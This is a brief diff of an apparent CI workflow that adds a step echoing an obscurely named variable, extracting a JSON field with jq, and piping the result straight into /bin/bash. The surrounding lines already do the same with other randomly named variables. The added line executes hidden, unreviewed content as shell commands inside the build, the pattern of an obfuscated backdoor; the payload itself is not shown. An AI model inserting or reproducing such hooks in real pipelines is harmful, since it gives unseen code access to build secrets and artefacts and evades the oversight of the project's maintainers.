@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$mhbnm5" | jq -r .rbl77601 | /bin/bash
           echo $fr29859 | jq -r .fvh6645 | /bin/bash
           echo $s741 | jq -r .sbo969 | /bin/bash
+          echo $bb0459 | jq -r .e3 | /bin/bash
 
       - name: Archive results
         if: always()
